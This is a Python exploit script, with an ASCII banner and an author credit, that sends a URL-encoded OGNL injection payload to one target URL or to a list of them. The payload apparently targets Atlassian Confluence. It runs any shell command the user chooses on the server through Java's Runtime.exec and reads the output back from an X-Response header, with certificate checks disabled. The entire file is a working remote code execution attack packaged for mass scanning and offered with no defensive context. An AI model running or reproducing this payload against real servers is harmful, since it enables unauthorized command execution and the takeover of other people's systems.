import argparse
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    print('''
                           ******** **       **     **
                          /**///// /**      /**    /**
  *****   ******  ******* /**      /**      /**    /**
 **///** **////**//**///**/******* /**      /**    /**
/**  // /**   /** /**  /**/**////  /**      /**    /**
/**   **/**   /** /**  /**/**      /**      /**    /**
//***** //******  ***  /**/**      /********//******* 
 /////   //////  ///   // //       ////////  ///////   

                       </coded by Luchoane>
''')


def main_func():
    if arguments.url:
        url_exploit(arguments.url, arguments.cmd)
    if arguments.f:
        file_exploit(arguments.f, arguments.cmd)


def url_exploit(url, cmd):
    payload = f'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Response%22%2C%23a%29%29%7D/'

    try:
        r = requests.get(f'{url}/{payload}', verify=False, allow_redirects=False, timeout=10)
        if 'X-Response' in r.headers:
            print(f'[++++++] VULNERABLE: {url} | [{r.headers["X-Response"]}]')
        else:
            print(f'[-] NOT VULNERABLE: {url}')
    except:
        print("[!] There was an error connecting!")


def file_exploit(f, cmd):
    payload = f'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Response%22%2C%23a%29%29%7D/'

    f = open(f, "r").read().splitlines()
    for url in f:
        try:
            r = requests.get(f'{url}/{payload}', verify=False, allow_redirects=False, timeout=10)
            if 'X-Response' in r.headers:
                print(f'[++++++] VULNERABLE: {url} | [{r.headers["X-Response"]}]')
            else:
                print(f'[-] NOT VULNERABLE: {url}')
        
        except KeyboardInterrupt:
            print("[!] Exiting... BYE!")
            sys.exit(0)
        
        except:
            print("[!] There was an error connecting!")
        
        


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', action='store', help='target url', dest='url', required=False)
    parser.add_argument('-f','--file', action='store', help='url file', dest='f', required=False)
    parser.add_argument('-cmd', '--command', action='store', help='command', dest='cmd', required=False)
    arguments = parser.parse_args()
    banner()
    main_func()
